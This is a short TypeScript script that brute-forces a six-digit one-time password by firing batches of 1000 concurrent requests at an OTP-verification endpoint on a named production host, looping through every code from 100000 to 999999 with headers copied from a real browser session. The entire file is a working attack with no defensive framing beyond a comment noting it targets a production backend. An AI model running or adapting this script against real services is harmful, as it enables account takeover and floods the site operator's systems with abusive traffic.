import axios from 'axios';

async function sendRequest(otp: string) {
  /* POSTMAN METHOD FOR A PROD BACKEND */

  //copy and replace the Postman's code for curl command you copied with below config.
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=test%40gmail.com&otp=${otp}`,
    headers: {
      accept: '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'auth-key': 'appxapi',
      'client-service': 'Appx',
      'device-type': '',
      dnt: '1',
      origin: 'https://harkirat.classx.co.in',
      priority: 'u=1, i',
      referer: 'https://harkirat.classx.co.in/',
      'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      source: 'website',
      'user-agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    },
  };

  try {
    await axios.request(config);
  } catch (e) {
    // console.log(e);
  }
}

//Script of sending OTPs
async function main() {
  for (let i = 100000; i <= 999999; i += 1000) {
    const promises = [];

    //sending in a batch of 1000
    for (let j = i; j <= i + 999; j++) {
      console.log('Sending request for OTP:', j);
      promises.push(sendRequest(j.toString()));
    }

    await Promise.all(promises);
  }
}

main();
